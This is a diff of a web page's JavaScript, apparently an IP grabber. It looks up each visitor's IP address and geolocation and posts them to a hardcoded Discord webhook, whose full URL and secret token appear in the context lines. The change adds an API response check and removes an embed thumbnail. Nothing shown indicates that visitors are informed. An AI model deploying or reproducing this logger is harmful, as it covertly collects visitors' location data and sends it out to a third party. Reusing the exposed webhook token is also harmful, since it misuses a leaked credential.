@@ -16,6 +16,12 @@
                 // Fetch the geolocation data using api.iplocation.net
                 let locationResponse = await fetch(`https://api.iplocation.net/?ip=${ip}`);
                 let locationData = await locationResponse.json();
+                
+                // Check response code to ensure successful API call
+                if (locationData.response_code !== '200') {
+                    throw new Error(locationData.response_message);
+                }
+
                 return { ip: ip, location: locationData };
             } catch (error) {
                 console.error('Error getting IP and location:', error);
@@ -27,7 +33,6 @@
         async function sendToDiscord(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
             const location = data.location || {};
-            const imageURL = "https://i.ibb.co/JCPBJzB/image.png";
 
             const payload = {
                 content: null,
@@ -53,9 +58,6 @@
                         ],
                         author: {
                             name: "IP & Info"
-                        },
-                        thumbnail: {
-                            url: imageURL
                         }
                     }
                 ],
